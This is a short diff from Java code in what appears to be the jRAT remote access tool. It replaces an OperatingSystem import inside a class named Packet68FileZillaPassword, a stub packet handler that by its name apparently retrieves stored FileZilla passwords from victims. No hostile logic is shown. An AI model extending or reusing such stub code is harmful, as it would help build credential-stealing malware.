@@ -10,10 +10,11 @@ import org.w3c.dom.Element;
 import org.w3c.dom.Node;
 import org.w3c.dom.NodeList;
 
-import se.jrat.common.OperatingSystem;
 import se.jrat.stub.Connection;
 import se.jrat.stub.packets.outgoing.Packet48FileZillaPassword;
 import se.jrat.stub.utils.Utils;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 
 public class Packet68FileZillaPassword extends AbstractIncomingPacket {
